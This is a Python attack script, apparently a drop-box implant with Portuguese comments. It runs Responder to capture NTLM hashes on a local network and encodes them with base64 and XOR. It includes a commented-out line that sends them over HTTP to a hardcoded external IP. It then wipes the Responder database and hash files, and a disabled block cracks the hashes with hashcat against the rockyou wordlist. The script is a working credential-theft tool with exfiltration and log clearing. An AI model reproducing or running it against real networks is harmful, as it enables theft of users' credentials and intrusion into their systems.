import os
import subprocess
from datetime import datetime
import base64
import requests
import time
import sys

def xor_encrypt(base64_string, key):
    key_length = len(key)
    encrypted_bytes = []
    for i, byte in enumerate(base64_string):
        encrypted_byte = byte ^ key[i % key_length]  # Aplicando XOR byte a byte
        encrypted_bytes.append(encrypted_byte)
    return bytes(encrypted_bytes)

conteudo_arquivo = ""

# Nome do arquivo a ser lido
nome_arquivo = "/tmp/captured_mac.txt"

# Lê o arquivo e armazena seu conteúdo em uma variável
try:
    with open(nome_arquivo, 'r') as f:
        conteudo_arquivo = f.read()
        if len(conteudo_arquivo) > 5:
            print(f"[!] MAC Capturado: {conteudo_arquivo}")
            print("[+] MAC Alterado! (macchanger)")
        else:
            print("[X] Nenhum MAC Encontrado...")
            sys.exit(0)
except FileNotFoundError:
    print(f"[X] Erro: o arquivo '{nome_arquivo}' não foi encontrado.")
    sys.exit(0)

import time

def get_eth0_ip():
    while True:
        try:
            result = subprocess.run(['ip', 'addr', 'show', 'eth1'], capture_output=True, text=True)
            output = result.stdout
            lines = output.splitlines()
            for line in lines:
                if 'inet ' in line:  # Procura pela linha que contém 'inet '
                    ip_address = line.split()[1]
                    return ip_address
            # Se nenhum endereço IP foi encontrado, espera por um curto período antes de tentar novamente
            time.sleep(1)
        except subprocess.CalledProcessError:
            # Em caso de erro ao executar o comando, espera e tenta novamente
            time.sleep(1)

print("[+] Aguardando definir o ip...")

ip = get_eth0_ip()
print(f'[!] IPv4: {ip}')


print("[+] Iniciando Responder")
os.system("sudo service responder stop")
os.system("sudo service responder start")
i=0
while True:
    # Verifica Hashes Coletados + Filtra lista
    output = subprocess.check_output("/usr/share/responder/DumpHash.py", shell=True)
    lista = str(output).split("\\n")
    lista_filtrada = [elemento for elemento in lista if "::" in elemento]

    # Verifica Quantidade de Hashes Coleta + Cria Arquivo .txt único de Backup
    nome_arquivo="hashes-"+datetime.now().strftime("%Y-%m-%d-%H-%M-%S")+".txt"
    ip = get_eth0_ip()
    print("[+]",len(lista_filtrada),"Hashes coletadas |",ip,"| Tempo:",i,"s")
    i+=10
    if len(lista_filtrada) >= 10:
        print("[+] Salvando hashes coletados no arquivo:",nome_arquivo)
        os.system("cp DumpNTLMv2.txt "+nome_arquivo)
        print("[+] Exfiltrando hashes via HTTP")
        lista_hashes=""
        # Lista -> Base64
        for hashes in lista_filtrada: lista_hashes+=hashes+","
        b = base64.b64encode(bytes(lista_hashes, 'utf-8')) # bytes
        # Base64 -> Cripto XOR
        # Chave hardcoded (por exemplo, uma lista de bytes)
        key = [0x1A, 0x2B, 0x3C, 0x4D, 0x5E]  # Substitua pelos seus valores de chave
        # Decodificar a string base64 para byte
        decoded_bytes = base64.b64decode(b)
        # Criptografar usando XOR
        encrypted_bytes = xor_encrypt(decoded_bytes, key)

        #requests.get("http://69.55.55.7:3031/"+str(b))
        print("[+] Limpando database Responder")
        os.system("echo '' > DumpNTLMv2.txt && echo '' > DumpNTLMv1.txt")
        os.system("rm /usr/share/responder/Responder.db")
        print("[+] Resetando Responder")
        os.system("sudo service responder restart")
        print("[+] Coletando novos Hashes...")
        i=0
    time.sleep(10)

        

    #sudo john --show hashes-2024-06-28-11-25-10.txt


    # https://medium.com/@ekiser_48014/python-penetration-testing-using-hashcat-and-python-to-crack-windows-passwords-34cb4f052bf3

    # Tool that simplifies the Hashcat cracking process.
    '''
    print("[+] Iniciando quebra de Hashes com hashcat + rockyou...")
    import subprocess

    # Prompt for type of hash
    hash_type = 5600

    # Prompt for location of hash file
    hash_file = "/usr/share/responder/"+nome_arquivo

    # Prompt for location to save findings
    output_file = "/usr/share/responder/cracked-"+nome_arquivo

    # Prompt for location of word list file
    word_list_file = "/usr/share/wordlists/rockyou.txt"

    # Define hashcat command with multithreading option
    hashcat_command = f"hashcat -m {hash_type} -a 0 {hash_file} {word_list_file} --potfile-disable --remove --outfile {output_file} 2>&-"

    # Execute hashcat command using subprocess
    try:
        print("[+] Hashcat Iniciado:",hashcat_command)
        output = subprocess.check_output(hashcat_command, shell=True)
    except Exception as e:
        print("[!] Hashcat finalizado:",e)'''




		
